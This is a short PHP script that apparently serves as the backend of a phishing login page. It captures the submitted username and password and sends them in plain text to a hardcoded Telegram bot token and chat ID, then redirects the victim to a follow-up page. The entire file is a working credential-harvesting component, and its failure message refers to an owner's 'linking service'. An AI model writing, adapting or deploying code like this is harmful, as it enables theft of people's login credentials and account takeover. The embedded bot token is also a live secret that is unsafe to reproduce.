<?php

$botToken = '6576235967:AAHxGOuIDEOI7yOWnRQuAu67jQhYSXTqWQQ';

$chatId = '6547568174';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // The URL for sending messages to the Telegram bot API
    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    // Message to be sent
    $message = "Username: $username\nPassword: $password";

    // Data to be sent in the request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Create options for the HTTP request
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
        ],
    ];

    // Create a stream context
    $context  = stream_context_create($options);

    // Make the HTTP request using file_get_contents
    $result = file_get_contents($telegramApiUrl, false, $context);

    // Check if the message was sent successfully
    $resultArray = json_decode($result, true);
    if ($resultArray['ok']) {
        header("location: ../solution.html?bones=5");
    } else {
        echo "contact the Owner for the linking service: " . $resultArray['description'];
    }
}
?>
